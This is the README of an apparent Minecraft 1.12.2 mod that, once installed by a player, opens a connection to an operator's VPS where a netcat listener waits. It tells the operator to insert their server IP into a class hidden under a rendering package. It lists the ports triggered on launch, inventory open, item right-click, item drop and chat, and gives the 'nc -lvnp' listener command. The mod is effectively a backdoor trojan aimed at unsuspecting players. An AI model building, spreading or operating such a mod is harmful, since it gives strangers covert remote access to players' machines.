# shellmodminecraft
A simple mod for minecraft game in 1.12.2, when used by client it connects to remote server who use nc -lvnp command

First edit the class: fr.kharhe.inventory.client.render.custom.Render.java and use your own vps ip.

And now on your vps, run the following command: nc -lvnp [Port]

List of port used:

-On minecraft Launch: 9050

-When open inventory server side: 9000

-On Item Right click: 9002

-On Item Dropped: 9003

-On message: 9005

Example: 

If i want to connect client to my server when he drop item, i run "nc -lvnp 9003" 

